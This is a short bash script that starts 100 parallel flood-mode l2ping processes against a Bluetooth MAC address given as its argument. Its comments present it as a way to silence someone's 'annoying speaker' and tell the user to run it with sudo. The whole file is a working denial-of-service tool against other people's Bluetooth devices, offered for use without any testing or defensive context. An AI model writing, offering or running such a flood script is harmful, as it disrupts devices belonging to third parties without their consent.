#!/bin/bash
# Use the annoying speaker's MAC address as the first argument of this bash script and run it with sudo.
# Enjoy the silence!

_counter=0

while (( 100 > $_counter ))
do
	_counter=$(($_counter+1))
	l2ping -s 640 -f $1 & 
done
